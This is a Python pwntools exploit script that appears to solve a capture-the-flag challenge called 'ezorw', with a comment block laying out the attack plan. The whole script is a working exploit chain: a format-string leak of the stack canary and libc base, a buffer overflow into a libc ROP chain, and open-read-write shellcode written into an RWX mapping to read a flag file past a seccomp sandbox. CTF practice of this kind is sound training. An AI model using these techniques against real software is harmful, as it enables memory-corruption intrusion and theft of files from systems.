'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

mmap((void *)0x66660000, 0x1000uLL, 7, 50, -1, 0LL);
mmap RWX privileges to 0x66660000
    
Ubuntu GLIBC 2.35-0ubuntu3.1

sandbox pass: ORW bypass sandbox to read flag
1. determine format string parameter ordinal number
2. fmtstr leaks canary value and libc address
3. constructing ROP chain with libc
4. buffer overflow to hijack return address to ROP chain
5. ROP to read ORW payload to mmap_addr
6. return to mmap_addr
7. execute ORW payload
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "27368" 
filename = "./ezorw"
elf = ELF(filename)
local_libc = "/home/fa1c4/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6"
remote_libc = './libc.so.6'
libc= ELF(local_libc if local else remote_libc)
# libc= ELF(remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B():
    gdb.attach(io)
    pause()

mmap_addr = 0x66660000
pop_rdi_ret_relative_addr = 0x000000000002a3e5
pop_rsi_ret_relative_addr = 0x000000000002be51
pop_rdx_r12_ret_relative_addr = 0x000000000011f497

def pwn():
    # payload = b'ffffffff%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p'
    payload = b'%11$p|%33$p|'
    io.sendlineafter(b'Try to escape the sandbox\n', payload)
    canary_value = int(io.recvuntil(b'|', drop=True), 16)
    libc__start_main_addr = int(io.recvuntil(b'|', drop=True), 16) - 128
    libc.address = libc__start_main_addr - libc.sym['__libc_start_main']
    pop_rdi_ret_addr = libc.address + pop_rdi_ret_relative_addr
    pop_rsi_ret_addr = libc.address + pop_rsi_ret_relative_addr
    pop_rdx_r12_ret_addr = libc.address + pop_rdx_r12_ret_relative_addr
    read_addr = libc.sym['read']
    # B()
    payload = cyclic(40) + p64(canary_value) + cyclic(8)
    payload += p64(pop_rdi_ret_addr) + p64(0) 
    payload += p64(pop_rsi_ret_addr) + p64(mmap_addr)
    payload += p64(pop_rdx_r12_ret_addr) + p64(0x400) + p64(0) 
    payload += p64(read_addr) + p64(mmap_addr)
    io.sendlineafter(b"I think you can get flag now\n", payload)

    # ORW construction
    orw_payload = shellcraft.open('./flag')
    orw_payload += shellcraft.read(3, mmap_addr, 0x100)
    orw_payload += shellcraft.write(1, mmap_addr, 0x100)
    orw_payload = asm(orw_payload)
    # send ORW payload through read(3, mmap_addr+21, 0x400)
    # sleep(0.5)
    io.sendline(orw_payload) 


if __name__ == "__main__":
    pwn()
    io.interactive()
